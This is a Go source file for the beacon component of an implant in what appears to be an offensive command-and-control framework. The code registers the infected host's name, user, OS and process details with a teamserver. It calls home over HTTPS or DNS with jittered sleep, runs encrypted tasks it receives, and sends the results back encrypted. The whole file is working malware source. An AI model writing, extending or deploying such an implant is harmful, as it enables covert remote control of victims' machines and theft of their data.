package implant

import (
	"fmt"
	"log"
	"os"
	"os/user"
	"runtime"
	"time"

	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/pkg/plugin"
	"github.com/KKingZero/erebus-exploit-framwork/implant/tasks"
	"github.com/KKingZero/erebus-exploit-framwork/implant/transport"
	"google.golang.org/protobuf/proto"
)

type Beacon struct {
	config        *Config
	transport     transport.Transport
	executor      *tasks.Executor
	sessionID     string
	sessionKey    []byte // AES session key for encrypted comms
	sleep         time.Duration
	jitterPct     int
	pendingResults []*pb.TaskResult // buffered results from failed sends
}

func New(cfg *Config) (*Beacon, error) {
	var t transport.Transport
	switch cfg.TransportType {
	case "dns":
		t = transport.NewDNSTransport(cfg.DNSDomain, cfg.DNSServer)
	default:
		ht, err := transport.NewHTTPSTransport(cfg.Callback, cfg.CACertPEM, cfg.CDNDomain)
		if err != nil {
			return nil, fmt.Errorf("init HTTPS transport: %w", err)
		}
		t = ht
	}

	return &Beacon{
		config:    cfg,
		transport: t,
		executor:  tasks.NewExecutor(plugin.Global),
		sleep:     cfg.Sleep,
		jitterPct: cfg.JitterPct,
	}, nil
}

func (b *Beacon) Run() {
	// Register with teamserver
	if err := b.register(); err != nil {
		log.Printf("[implant] register failed: %v", err)
		// Retry with backoff
		for i := 0; i < 10; i++ {
			wait := zcrypto.JitterDuration(b.sleep*time.Duration(i+1), b.jitterPct)
			time.Sleep(wait)
			if err := b.register(); err == nil {
				break
			}
		}
		if b.sessionID == "" {
			log.Printf("[implant] failed to register after retries, exiting")
			return
		}
	}

	log.Printf("[implant] registered: session=%s", b.sessionID)

	// Beacon loop: single send per cycle
	for {
		// 1. Sleep with jitter (reduce for active SOCKS sessions)
		sleepDuration := b.sleep
		if tasks.SocksActive() && sleepDuration > 100*time.Millisecond {
			sleepDuration = 100 * time.Millisecond
		}
		wait := zcrypto.JitterDuration(sleepDuration, b.jitterPct)
		time.Sleep(wait)

		// 2. Send beacon with any pending results
		resp := b.sendResults(b.pendingResults)

		// 3. On failure, keep pendingResults for retry
		if resp == nil {
			continue
		}

		// 4. On success, clear pendingResults
		b.pendingResults = nil

		// 5. Check terminate/sleep-update
		if resp.Terminate {
			log.Printf("[implant] terminate received, exiting")
			return
		}

		if resp.NextCheckinMs > 0 {
			b.sleep = time.Duration(resp.NextCheckinMs) * time.Millisecond
		}

		// 6. Execute response tasks, append results to pendingResults
		taskList := b.decryptTasks(resp)

		for _, task := range taskList {
			if task.TaskType == pb.TaskType_TASK_EXIT {
				log.Printf("[implant] exit task received")
				return
			}
			if task.TaskType == pb.TaskType_TASK_SLEEP {
				b.handleSleep(task)
				b.pendingResults = append(b.pendingResults, &pb.TaskResult{
					TaskId:  task.TaskId,
					Success: true,
				})
				continue
			}
			result := b.executor.Execute(task)
			b.pendingResults = append(b.pendingResults, result)
		}
		// 7. Results will be sent on NEXT cycle
	}
}

func (b *Beacon) register() error {
	hostname, _ := os.Hostname()
	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	now := time.Now().Unix()
	hmac := zcrypto.ComputeHMAC(b.config.Secret, b.config.ImplantID, now)

	reg := &pb.Register{
		ImplantId:      b.config.ImplantID,
		Hostname:       hostname,
		Username:       username,
		Os:             runtime.GOOS,
		Arch:           runtime.GOARCH,
		Pid:            uint32(os.Getpid()),
		IntegrityLevel: getIntegrityLevel(),
		Timestamp:      now,
		Hmac:           hmac,
	}

	resp, err := b.transport.Register(reg)
	if err != nil {
		return err
	}

	if !resp.Success {
		return fmt.Errorf("registration rejected by server")
	}

	b.sessionID = resp.SessionId
	if resp.NextCheckinMs > 0 {
		b.sleep = time.Duration(resp.NextCheckinMs) * time.Millisecond
	}

	// Decrypt session key if provided — fail registration on error to avoid half-encrypted sessions.
	if len(resp.EncryptedSessionKey) > 0 {
		sessionKey, err := zcrypto.AESDecrypt(b.config.Secret, resp.EncryptedSessionKey)
		if err != nil {
			return fmt.Errorf("decrypt session key: %w", err)
		}
		b.sessionKey = sessionKey
		log.Printf("[implant] session key established")
	}

	return nil
}

func (b *Beacon) sendResults(results []*pb.TaskResult) *pb.BeaconResponse {
	now := time.Now().Unix()
	hmac := zcrypto.ComputeHMAC(b.config.Secret, b.config.ImplantID, now)

	beacon := &pb.Beacon{
		ImplantId: b.config.ImplantID,
		SessionId: b.sessionID,
		Timestamp: now,
		Hmac:      hmac,
	}

	if b.sessionKey != nil && len(results) > 0 {
		payload := &pb.BeaconResultsPayload{Results: results}
		plaintext, err := proto.Marshal(payload)
		if err != nil {
			log.Printf("[implant] marshal results payload error: %v", err)
			return nil
		}
		encrypted, err := zcrypto.AESEncrypt(b.sessionKey, plaintext)
		if err != nil {
			log.Printf("[implant] encrypt results error: %v", err)
			return nil
		}
		beacon.EncryptedResults = encrypted
	} else if b.sessionKey == nil {
		beacon.Results = results
	}

	resp, err := b.transport.Beacon(beacon)
	if err != nil {
		log.Printf("[implant] beacon error: %v", err)
		return nil
	}
	return resp
}

const maxSleepMs = 86400000 // 24 hours

func (b *Beacon) decryptTasks(resp *pb.BeaconResponse) []*pb.Task {
	if b.sessionKey == nil {
		return resp.Tasks
	}
	if len(resp.EncryptedTasks) == 0 {
		return nil
	}
	plaintext, err := zcrypto.AESDecrypt(b.sessionKey, resp.EncryptedTasks)
	if err != nil {
		log.Printf("[implant] decrypt tasks error: %v", err)
		return nil
	}
	payload := &pb.BeaconTasksPayload{}
	if err := proto.Unmarshal(plaintext, payload); err != nil {
		log.Printf("[implant] unmarshal decrypted tasks error: %v", err)
		return nil
	}
	return payload.Tasks
}

func (b *Beacon) handleSleep(task *pb.Task) {
	sleepTask := &pb.SleepTask{}
	if err := proto.Unmarshal(task.Data, sleepTask); err != nil {
		return
	}
	if sleepTask.SleepMs > 0 {
		ms := sleepTask.SleepMs
		if ms > maxSleepMs {
			ms = maxSleepMs
		}
		b.sleep = time.Duration(ms) * time.Millisecond
	}
	// Only update jitter if explicitly set (non-zero)
	if sleepTask.JitterPct > 0 && sleepTask.JitterPct <= 100 {
		b.jitterPct = int(sleepTask.JitterPct)
	}
}
